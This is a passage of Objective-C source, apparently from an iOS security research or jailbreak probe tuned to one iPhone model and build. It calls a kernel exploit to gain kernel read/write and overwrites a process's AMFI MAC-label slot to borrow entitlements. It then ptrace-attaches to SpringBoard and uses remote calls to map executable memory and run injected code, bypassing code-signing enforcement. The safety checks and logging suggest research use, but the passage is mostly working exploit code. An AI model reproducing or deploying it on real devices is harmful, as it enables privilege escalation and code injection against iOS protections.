    CNDRecord(@"amfiBorrowRestored", @(borrow->restored));
    CNDRecord(@"amfiBorrowRestoreWholeLabelExact", @(finalExact));
    CNDRecord(@"amfiBorrowFinalObject", CNDHex(finalObject));
    return borrow->restored;
}

static bool CNDPrepareAMFIEntitlementBorrow(const CNDProbeAPI *api,
    pid_t pid, uint64_t expectedProc, uint64_t expectedTask,
    CNDAMFIEntitlementBorrow *borrow)
{
    if (!borrow) return false;
    memset(borrow, 0, sizeof(*borrow));
    if (!api || !api->amfiSlotOffset ||
        *api->amfiSlotOffset != UINT32_C(0x8) ||
        !CNDIdentityMatches(api, pid, expectedProc, expectedTask)) {
        CNDRecord(@"amfiBorrowRefusal", @"identity-or-slot-offset");
        return false;
    }

    borrow->selfProc = api->procSelf();
    borrow->selfLabel = borrow->selfProc
        ? api->procGetCredLabel(borrow->selfProc) : 0;
    borrow->targetLabel = api->procGetCredLabel(expectedProc);
    borrow->targetSlotAddress = borrow->targetLabel +
        *api->amfiSlotOffset;
    borrow->donorAMFIObject = borrow->selfLabel
        ? api->amfiCslotGet(borrow->selfLabel) : 0;
    borrow->originalAMFIObject = borrow->targetLabel
        ? api->amfiCslotGet(borrow->targetLabel) : 0;

    CNDRecord(@"amfiBorrowTransport",
        @"aligned-full-mac-label-32-byte-checked");
    CNDRecord(@"amfiBorrowZoneSize", @(CND_MAC_LABEL_SIZE));
    CNDRecord(@"amfiBorrowPanicGuard",
        @"write begins at the MAC-label base and exactly spans its 0x20-byte zone object");

    CNDRecord(@"amfiBorrowSelfProc", CNDHex(borrow->selfProc));
    CNDRecord(@"amfiBorrowSelfLabel", CNDHex(borrow->selfLabel));
    CNDRecord(@"amfiBorrowTargetLabel", CNDHex(borrow->targetLabel));
    CNDRecord(@"amfiBorrowSlotOffset", @(*api->amfiSlotOffset));
    CNDRecord(@"amfiBorrowSlotAddress",
        CNDHex(borrow->targetSlotAddress));
    CNDRecord(@"amfiBorrowDonorObject",
        CNDHex(borrow->donorAMFIObject));
    CNDRecord(@"amfiBorrowOriginalObject",
        CNDHex(borrow->originalAMFIObject));

    bool shape = CNDKernelObjectPointer(borrow->selfProc) &&
        borrow->selfProc != expectedProc &&
        CNDKernelObjectPointer(borrow->selfLabel) &&
        CNDKernelObjectPointer(borrow->targetLabel) &&
        borrow->selfLabel != borrow->targetLabel &&
        CNDKernelObjectPointer(borrow->donorAMFIObject) &&
        CNDKernelObjectPointer(borrow->originalAMFIObject) &&
        borrow->donorAMFIObject != borrow->originalAMFIObject &&
        api->kread64(borrow->selfLabel + *api->amfiSlotOffset) ==
            borrow->donorAMFIObject &&
        api->kread64(borrow->targetSlotAddress) ==
            borrow->originalAMFIObject;
    CNDRecord(@"amfiBorrowShapeVerified", @(shape));
    if (!shape) return false;

    borrow->originalLabelCaptured = CNDReadMACLabel(
        api, borrow->targetLabel, borrow->originalLabel);
    uint64_t capturedOriginalObject = 0;
    if (borrow->originalLabelCaptured) {
        memcpy(&capturedOriginalObject,
            borrow->originalLabel + *api->amfiSlotOffset,
            sizeof(capturedOriginalObject));
    }
    bool capturedExact = borrow->originalLabelCaptured &&
        capturedOriginalObject == borrow->originalAMFIObject;
    CNDRecord(@"amfiBorrowOriginalWholeLabelCaptured",
        @(borrow->originalLabelCaptured));
    CNDRecord(@"amfiBorrowOriginalSlotMatchesLabelImage", @(capturedExact));
    if (!capturedExact) return false;

    memcpy(borrow->borrowedLabel, borrow->originalLabel,
        CND_MAC_LABEL_SIZE);
    memcpy(borrow->borrowedLabel + *api->amfiSlotOffset,
        &borrow->donorAMFIObject, sizeof(borrow->donorAMFIObject));

    /* The physical primitive writes exactly 0x20 bytes. The previous +0x8
     * transport start crossed this 0x20-byte MAC-label zone object and was
     * rejected by the kernel's zone bounds check. Always start at the object
     * base, change only bytes [8, 16), and verify the complete label image. */
    borrow->writeAttempted = true;
    borrow->installed = CNDWriteAndVerifyMACLabel(
        api, borrow->targetLabel, borrow->borrowedLabel);
    CNDRecord(@"amfiBorrowInstalled", @(borrow->installed));
    CNDRecord(@"amfiBorrowInstalledWholeLabelExact",
        @(borrow->installed));
    if (!borrow->installed) {
        (void)CNDRestoreAMFIEntitlementBorrow(api, borrow);
        CNDRecord(@"amfiBorrowRestoredAfterInstallFailure",
            @(borrow->restored));
    }
    return borrow->installed;
}

static bool CNDEnableThroughAttach(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask,
    bool borrowAMFIEntitlements)
{
    CNDAMFIEntitlementBorrow borrow = {0};
    if (borrowAMFIEntitlements && !CNDPrepareAMFIEntitlementBorrow(
            api, pid, expectedProc, expectedTask, &borrow)) {
        bool criticalRestoreFailure = borrow.writeAttempted &&
            !borrow.restored;
        CNDRecord(@"result", criticalRestoreFailure
            ? @"critical-amfi-entitlement-restore-failed"
            : @"refused-amfi-entitlement-borrow");
        if (criticalRestoreFailure) {
            (void)CNDForceSpringBoardRestart(
                api, pid, expectedProc, expectedTask);
        }
        return false;
    }
    errno = 0;
    int attach = ptrace(CND_PT_ATTACHEXC, pid, NULL, 0);
    int attachErrno = errno;
    bool borrowRestored = !borrowAMFIEntitlements ||
        CNDRestoreAMFIEntitlementBorrow(api, &borrow);
    CNDRecord(borrowAMFIEntitlements
        ? @"amfiBorrowPtraceAttachResult"
        : @"baselinePtraceAttachResult", @(attach));
    CNDRecord(borrowAMFIEntitlements
        ? @"amfiBorrowPtraceAttachErrno"
        : @"baselinePtraceAttachErrno", @(attachErrno));
    CNDRecord(@"ptraceAttachResult", @(attach));
    CNDRecord(@"ptraceAttachErrno", @(attachErrno));
    if (!borrowRestored) {
        CNDRecord(@"result", @"critical-amfi-entitlement-restore-failed");
        if (attach == 0) {
            int status = 0;
            (void)CNDWaitForStop(pid, &status);
            errno = 0;
            int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
            CNDRecord(@"amfiBorrowEmergencyPtraceKillResult", @(killResult));
            CNDRecord(@"amfiBorrowEmergencyPtraceKillErrno", @(errno));
            (void)CNDWaitForIdentityExit(
                api, pid, expectedProc, expectedTask);
        } else {
            (void)CNDForceSpringBoardRestart(
                api, pid, expectedProc, expectedTask);
        }
        return false;
    }
    if (attach != 0) {
        if (borrowAMFIEntitlements) {
            CNDRecord(@"result",
                @"failed-amfi-borrow-ptrace-not-authorized");
        }
        return false;
    }
    CNDRecord(@"ptraceAttachAccepted", @YES);
    CNDRecord(@"springBoardResetRequired", @YES);
    CNDRecord(@"cyanideTerminationRequired", @YES);
    gCNDProbeTerminateHostAfterRun = true;

    int waitStatus = 0;
    bool stopped = CNDWaitForStop(pid, &waitStatus);
    CNDRecord(@"ptraceStopObserved", @(stopped));
    CNDRecord(@"ptraceWaitStatus", @(waitStatus));
    if (!stopped || !CNDIdentityMatches(api, pid, expectedProc, expectedTask)) {
        CNDRecord(@"result", @"failed-after-attach-before-detach");
        CNDRecord(@"state", @"result-persisted-before-springboard-reset");
        errno = 0;
        int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
        CNDRecord(@"ptraceEmergencyKillResult", @(killResult));
        CNDRecord(@"ptraceEmergencyKillErrno", @(errno));
        bool reset = CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        return false;
    }

    errno = 0;
    int detach = ptrace(CND_PT_DETACH, pid, (caddr_t)(uintptr_t)1, 0);
    int detachErrno = errno;
    CNDRecord(@"ptraceDetachResult", @(detach));
    CNDRecord(@"ptraceDetachErrno", @(detachErrno));
    if (detach != 0) {
        CNDRecord(@"result", @"failed-detach-after-accepted-attach");
        CNDRecord(@"state", @"result-persisted-before-springboard-reset");
        errno = 0;
        int killResult = ptrace(CND_PT_KILL, pid, NULL, 0);
        CNDRecord(@"ptraceEmergencyKillResult", @(killResult));
        CNDRecord(@"ptraceEmergencyKillErrno", @(errno));
        bool reset = CNDWaitForIdentityExit(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        return false;
    }
    bool identity = CNDIdentityMatches(api, pid, expectedProc, expectedTask);
    if (!identity) {
        CNDRecord(@"result", @"failed-springboard-changed-after-detach");
        CNDRecord(@"springBoardFinalResetProven", @YES);
    }
    return identity;
}

static bool CNDTerminateSpringBoardSession(const CNDProbeAPI *api,
    CNDProbeRemoteCallSession *session, pid_t pid, uint64_t proc,
    uint64_t task)
{
    bool exited = !CNDIdentityMatches(api, pid, proc, task);
    int dispatch = 0;
    if (!exited && [session hasLocalState]) {
        dispatch = [session dispatchSelfSIGKILLForExpectedPID:pid
            proc:proc task:task report:NULL];
        exited = CNDWaitForIdentityExit(api, pid, proc, task);
    }
    CNDRecord(@"springBoardTerminalDispatch", @(dispatch));
    CNDRecord(@"springBoardExitProven", @(exited));
    if (exited) {
        [session abandonRemoteCall];
    } else if (![session hasInFlightSyntheticCall]) {
        (void)[session destroyRemoteCall];
    }
    CNDRecord(@"remoteSessionClosed", @(![session hasLocalState]));
    return exited;
}

static bool CNDRunRXNonce(const CNDProbeAPI *api, pid_t pid,
    uint64_t expectedProc, uint64_t expectedTask,
    bool *debuggedObservedOut, bool *resetOut)
{
    if (debuggedObservedOut) *debuggedObservedOut = false;
    if (resetOut) *resetOut = false;
    CNDProbeRemoteCallSession *session = CNDCreateSpringBoardSession(api);
    if (!session) {
        CNDRecord(@"remoteCallFailure", @"could not open SpringBoard session");
        CNDRecord(@"result", @"failed-springboard-remotecall-unavailable");
        bool reset = CNDForceSpringBoardRestart(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        if (resetOut) *resetOut = reset;
        return false;
    }
    CNDProbeTargetIdentity identity = {0};
    bool bound = CNDCopySpringBoardSessionIdentity(
        api, session, &identity) && identity.pid == pid &&
        identity.proc == expectedProc && identity.task == expectedTask;
    CNDRecord(@"remoteCallIdentityBound", @(bound));
    if (!bound) {
        if ([session hasLocalState] && ![session hasInFlightSyntheticCall]) {
            (void)[session destroyRemoteCall];
        }
        CNDRecord(@"result", @"failed-springboard-remotecall-identity");
        bool reset = CNDForceSpringBoardRestart(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        if (resetOut) *resetOut = reset;
        return false;
    }

    __block uint64_t page = 0;
    __block int64_t protectResult = -1;
    __block int protectErrno = 0;
    __block uint64_t nonceResult = 0;
    __block bool transportHealthy = false;
    __block bool statusReadable = false;
    __block uint32_t flagsAfter = 0;
    @try {
        api->withSession(session, ^{
            uint64_t status = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc", sizeof(uint32_t),
                0, 0, 0, 0, 0, 0, 0);
            if (!status || !api->remoteSuccess()) return;
            (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                "memset", status, 0, sizeof(uint32_t), 0, 0, 0, 0, 0);
            int64_t statusResult = (int64_t)api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "csops", (uint64_t)pid,
                CND_CS_OPS_STATUS, status, sizeof(uint32_t), 0, 0, 0, 0);
            statusReadable = statusResult == 0 && api->remoteSuccess() &&
                [session remoteRead:status to:&flagsAfter
                    size:sizeof(flagsAfter)];
            if (api->remoteSuccess()) {
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "free", status, 0, 0, 0, 0, 0, 0, 0);
            }
            if (!statusReadable || (flagsAfter & CND_CS_DEBUGGED) == 0) {
                return;
            }
            uint64_t pageSize = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "getpagesize",
                0, 0, 0, 0, 0, 0, 0, 0);
            if (pageSize < 4096 || pageSize > 65536 ||
                (pageSize & (pageSize - 1)) != 0) return;
            page = api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS, "mmap",
                0, pageSize, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANON, UINT64_MAX, 0, 0, 0);
            if (!page || page == UINT64_MAX || !api->remoteSuccess()) return;

            uint64_t scratch = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc",
                sizeof(kCNDRXNonceCode), 0, 0, 0, 0, 0, 0, 0);
            bool scratchWritten = scratch && [session remoteWrite:scratch
                from:kCNDRXNonceCode size:sizeof(kCNDRXNonceCode)];
            uint64_t copied = scratchWritten ? api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "memcpy", page, scratch,
                sizeof(kCNDRXNonceCode), 0, 0, 0, 0, 0) : 0;
            if (scratch && api->remoteSuccess()) {
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "free", scratch, 0, 0, 0, 0, 0, 0, 0);
            }
            if (copied != page || !api->remoteSuccess()) return;

            (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                "sys_icache_invalidate", page, sizeof(kCNDRXNonceCode),
                0, 0, 0, 0, 0, 0);
            protectResult = (int64_t)api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "mprotect", page, pageSize,
                PROT_READ | PROT_EXEC, 0, 0, 0, 0, 0);
            if (protectResult != 0 && api->remoteSuccess()) {
                uint64_t errnoAddress = api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "__error",
                    0, 0, 0, 0, 0, 0, 0, 0);
                if (errnoAddress) {
                    uint32_t remoteErrno = 0;
                    if ([session respondsToSelector:
                            @selector(remoteRead:to:size:)]) {
                        BOOL read = [(id)session remoteRead:errnoAddress
                            to:&remoteErrno size:sizeof(remoteErrno)];
                        if (read) protectErrno = (int)remoteErrno;
                    }
                }
            }
            if (protectResult == 0 && api->remoteSuccess()) {
                nonceResult = [session doRemoteCallStableWithTimeout:
                    CND_REMOTE_TIMEOUT_SECONDS functionAddress:page
                    functionName:"cnd_rx_nonce" x0:0 x1:0 x2:0 x3:0
                    x4:0 x5:0 x6:0 x7:0];
            }
            if (CNDIdentityMatches(api, pid, expectedProc, expectedTask) &&
                api->remoteSuccess()) {
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "munmap", page, pageSize, 0, 0, 0, 0, 0, 0);
            }
            transportHealthy = api->remoteSuccess();
        });
    } @catch (NSException *exception) {
        CNDRecord(@"remoteCallException", [NSString stringWithFormat:@"%@:%@",
            exception.name ?: @"exception", exception.reason ?: @"unknown"]);
    }

    CNDRecord(@"rxPage", CNDHex(page));
    CNDRecord(@"targetCSFlagsAfterAttach", CNDHex(flagsAfter));
    CNDRecord(@"targetCSFlagsAfterAttachReadable", @(statusReadable));
    bool debuggedObserved = statusReadable &&
        (flagsAfter & CND_CS_DEBUGGED) != 0;
    if (debuggedObservedOut) *debuggedObservedOut = debuggedObserved;
    CNDRecord(@"rxProtectResult", @(protectResult));
    CNDRecord(@"rxProtectErrno", @(protectErrno));
    CNDRecord(@"rxNonceResult", CNDHex(nonceResult));
    CNDRecord(@"remoteTransportHealthyAfterNonce", @(transportHealthy));
    bool success = protectResult == 0 && nonceResult == UINT64_C(0xc0de) &&
        transportHealthy;
    CNDRecord(@"csAllowInvalidObserved", @(debuggedObserved));
    CNDRecord(@"rxExecutionSuccess", @(success));
    CNDRecord(@"result", success ? @"success-private-rx-executed" :
        @"failed-private-rx-not-executed");
    CNDRecord(@"state", @"result-persisted-before-springboard-reset");

    bool reset = CNDTerminateSpringBoardSession(
        api, session, pid, expectedProc, expectedTask);
    if (!reset) {
        reset = CNDForceSpringBoardRestart(
            api, pid, expectedProc, expectedTask);
    }
    CNDRecord(@"springBoardFinalResetProven", @(reset));
    if (resetOut) *resetOut = reset;
    return success;
}

static void CNDRunProbe(void)
{
    @autoreleasepool {
        CNDRecord(@"state", @"starting");
        NSString *build = CNDOSBuild();
        CNDRecord(@"osBuild", build);
        if (![build isEqualToString:@CND_EXPECTED_BUILD]) {
            CNDRecord(@"result", @"refused-wrong-build");
            return;
        }

        CNDProbeAPI api = {0};
        bool apiResolved = false;
        for (unsigned int attempt = 0; attempt < 50; attempt++) {
            if (CNDResolveAPI(&api)) {
                apiResolved = true;
                break;
            }
            usleep(100000);
        }
        if (!apiResolved) {
            CNDRecord(@"result", @"refused-probe-api-unavailable");
            return;
        }

        gCNDKRWCleanup = api.krwCleanup;
        bool initiallyReady = api.krwReady();
        CNDRecord(@"krwInitiallyReady", @(initiallyReady));
        if (!initiallyReady) {
            gCNDKRWAcquisitionAttempted = true;
            CNDRecord(@"state", @"acquiring-krw");
            int exploitResult = api.kexploit();
            CNDRecord(@"kexploitResult", @(exploitResult));
        }

        bool ready = api.krwReady() && api.kernelBase &&
            CNDKernelPointer(*api.kernelBase);
        CNDRecord(@"krwValidated", @(ready));
        if (!ready) {
            CNDRecord(@"result", @"refused-krw-not-ready");
            return;
        }
        CNDRecord(@"state", @"validating-exact-kernel");
        if (!CNDVerifyExactKernel(&api)) {
            CNDRecord(@"result", @"refused-kernel-identity");
            return;
        }

        CNDRecord(@"springBoardIdentitySource",
            @"RemoteCallSession(SpringBoard)");
        CNDProbeTargetIdentity springBoard = {0};
        bool identity = CNDResolveSpringBoardIdentityFromRemoteCall(
            &api, &springBoard);
        pid_t pid = springBoard.pid;
        uint64_t proc = springBoard.proc;
        uint64_t task = springBoard.task;
        CNDRecord(@"springBoardPID", @(pid));
        CNDRecord(@"springBoardProc", CNDHex(proc));
        CNDRecord(@"springBoardTask", CNDHex(task));
        CNDRecord(@"springBoardIdentityVerified", @(identity));
        if (!identity) {
            CNDRecord(@"result", @"refused-springboard-identity");
            return;
        }

        uint32_t flagsBefore = 0;
        bool flagsBeforeReadable = CNDReadTargetCSFlagsRemote(
            &api, pid, proc, task, &flagsBefore);
        CNDRecord(@"targetCSFlagsBeforeReadable", @(flagsBeforeReadable));
        CNDRecord(@"targetCSFlagsBefore", CNDHex(flagsBefore));
        if (!flagsBeforeReadable) {
            CNDRecord(@"result", @"refused-cs-status-unreadable");
            return;
        }
        if ((flagsBefore & CND_CS_DEBUGGED) != 0) {
            CNDRecord(@"result", @"refused-target-already-debugged");
            return;
        }

        bool attached = CNDEnableThroughAttach(
            &api, pid, proc, task, false);
        CNDRecord(@"baselineAttachDetachCompleted", @(attached));
        CNDRecord(@"attachDetachCompleted", @(attached));
        CNDRecord(@"amfiBorrowSkipped", @YES);
        CNDRecord(@"amfiBorrowSkippedReason",
            @"SpringBoard identity-bound execution can request PT_TRACE_ME in-process; the physical socket writer returned EFAULT for the protected MAC-label object, so mutating that object is neither required nor retried");
        CNDRecord(@"state", @"springboard-identity-self-trace");

        /* The proven identity/KRW transport already executes ordinary calls
         * inside SpringBoard. Let that exact process request PT_TRACE_ME for
         * itself, then test the executable grant and signed marker. The
         * known-denied external attach above remains only a control result;
         * it is not a prerequisite and no credential/MAC-label is mutated. */
        bool injected = CNDRunSpringBoardDylibProbe(
            &api, pid, proc, task);
        if (!injected) {
            bool reset = CNDForceSpringBoardRestart(
                &api, pid, proc, task);
            CNDRecord(@"springBoardFinalResetProven", @(reset));
        }
    }
}

static void CNDReleaseKRW(void)
{
    if (!gCNDKRWCleanup) return;
    if (!gCNDKRWAcquisitionAttempted && !gCNDProbeTerminateHostAfterRun) {
        CNDRecord(@"krwLeftOpenBecausePreexisting", @YES);
        return;
    }
    bool readyBeforeCleanup = false;
    CNDKRWReadyFn ready = (CNDKRWReadyFn)dlsym(
        RTLD_DEFAULT, "kexploit_krw_ready");
    if (ready) readyBeforeCleanup = ready();
    CNDRecord(@"krwReadyBeforeCleanup", @(readyBeforeCleanup));
    bool parked = gCNDKRWCleanup();
    CNDRecord(@"krwTerminalCleanupParked", @(parked));
}

static NSString *CNDHardwareModel(void)
{
    char model[64] = {0};
    size_t size = sizeof(model);
    if (sysctlbyname("hw.machine", model, &size, NULL, 0) != 0 ||
        model[0] == '\0') return @"";
    return [NSString stringWithUTF8String:model] ?: @"";
}

BOOL CNDPhysicalCSAllowInvalidProbeIsSupported(NSString **reasonOut)
{
    NSString *model = CNDHardwareModel();
    NSString *build = CNDOSBuild();
    BOOL supported = [model isEqualToString:@"iPhone17,2"] &&
        [build isEqualToString:@CND_EXPECTED_BUILD];
    if (reasonOut) {
        *reasonOut = supported ? @"Exact iPhone17,2 / 23A341 target matched."
            : [NSString stringWithFormat:
                @"Requires iPhone17,2 on build 23A341; this device is %@ on %@.",
                model.length ? model : @"unknown hardware",
                build.length ? build : @"unknown build"];
    }
    return supported;
}

BOOL CNDPhysicalCSAllowInvalidProbeIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDProbeRunActive, 0) != 0;
}

void CNDPhysicalCSAllowInvalidProbeRun(
    CNDPhysicalCSAllowInvalidProbeCompletion completion)
{
    NSString *supportReason = nil;
    if (!CNDPhysicalCSAllowInvalidProbeIsSupported(&supportReason)) {
        NSDictionary *report = @{
            @"result": @"refused-unsupported-device",
            @"message": supportReason ?: @"Unsupported device.",
        };
        dispatch_async(dispatch_get_main_queue(), ^{ completion(report); });
        return;
    }
    if (!__sync_bool_compare_and_swap(&gCNDProbeRunActive, 0, 1)) {
        NSDictionary *report = @{
            @"result": @"refused-already-running",
            @"message": @"The physical RX probe is already running.",
        };
        dispatch_async(dispatch_get_main_queue(), ^{ completion(report); });
        return;
    }

    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    gCNDReportPath = [directory stringByAppendingPathComponent:
        @"CNDPhysicalCSAllowInvalidProbe.json"];
    gCNDKRWCleanup = NULL;
    gCNDKRWAcquisitionAttempted = false;
    gCNDProbeTerminateHostAfterRun = false;
    gCNDReport = [@{
        @"probe": @"physical-cs-allow-invalid-private-rx",
        @"expectedBuild": @CND_EXPECTED_BUILD,
        @"target": @"SpringBoard",
        @"armed": @YES,
        @"userTriggered": @YES,
        @"safety": @"The known-denied app-owned PT_ATTACHEXC runs first as a control result only. The proven identity/KRW transport then asks SpringBoard to invoke PT_TRACE_ME on itself and verifies CS_DEBUGGED before testing the executable sandbox grant and constructor-free marker. No credential, MAC-label, proc_ro, or code-sign flag is written. The exact SpringBoard identity is terminated after the result is persisted so its exception policy and trace state are cleared by replacement.",
    } mutableCopy];
    CNDRecord(@"reportPath", gCNDReportPath);
    CNDRecord(@"state", @"user-confirmed");

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        CNDRunProbe();
        CNDReleaseKRW();
        if (gCNDProbeTerminateHostAfterRun) {
            CNDRecord(@"cyanideTerminationRequested", @YES);
            (void)kill(getpid(), SIGKILL);
            _exit(0);
        }
        NSDictionary<NSString *, id> *report = nil;
        @synchronized (gCNDReport) {
            report = [gCNDReport copy];
        }
        __sync_lock_release(&gCNDProbeRunActive);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
